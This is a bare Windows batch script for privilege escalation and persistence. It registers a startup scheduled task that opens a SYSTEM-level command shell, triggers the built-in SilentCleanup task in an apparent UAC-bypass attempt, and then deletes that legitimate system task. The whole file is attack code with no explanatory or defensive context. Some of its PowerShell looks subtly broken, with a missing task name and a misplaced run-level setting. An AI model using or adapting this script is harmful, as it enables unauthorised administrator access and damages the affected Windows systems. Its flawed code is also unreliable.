@echo off
set command=cmd.exe /K
powershell -Command "Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '%command%') -Principal (New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType S4U) -Trigger (New-ScheduledTaskTrigger -AtStartup) -RunLevel Highest -Force"
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" > nul
powershell -Command "Unregister-ScheduledTask -TaskName '\Microsoft\Windows\DiskCleanup\SilentCleanup' -Confirm:$false"

